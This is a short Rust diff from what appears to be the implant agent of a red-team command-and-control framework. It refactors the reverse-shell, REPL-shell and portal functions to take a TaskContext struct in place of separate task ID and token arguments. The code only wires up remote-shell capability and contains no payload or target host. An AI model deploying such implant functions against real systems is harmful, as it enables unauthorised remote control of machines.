@@ -291,22 +291,27 @@ impl<T: Transport + Send + Sync + 'static> Agent for ImixAgent<T> {
 
     fn start_reverse_shell(
         &self,
-        task_id: i64,
-        jwt: String,
+        task_context: eldritch_agent::TaskContext,
         cmd: Option<String>,
     ) -> Result<(), String> {
+        let task_id = task_context.task_id;
+        let jwt = task_context.jwt;
         self.spawn_subtask(task_id, move |transport| async move {
             run_reverse_shell_pty(task_id, jwt, cmd, transport).await
         })
     }
 
-    fn create_portal(&self, task_id: i64, jwt: String) -> Result<(), String> {
+    fn create_portal(&self, task_context: eldritch_agent::TaskContext) -> Result<(), String> {
+        let task_id = task_context.task_id;
+        let jwt = task_context.jwt;
         self.spawn_subtask(task_id, move |transport| async move {
             run_create_portal(task_id, jwt, transport).await
         })
     }
 
-    fn start_repl_reverse_shell(&self, task_id: i64, jwt: String) -> Result<(), String> {
+    fn start_repl_reverse_shell(&self, task_context: eldritch_agent::TaskContext) -> Result<(), String> {
+        let task_id = task_context.task_id;
+        let jwt = task_context.jwt;
         let agent = self.clone();
         self.spawn_subtask(task_id, move |transport| async move {
             run_repl_reverse_shell(task_id, jwt, transport, agent).await
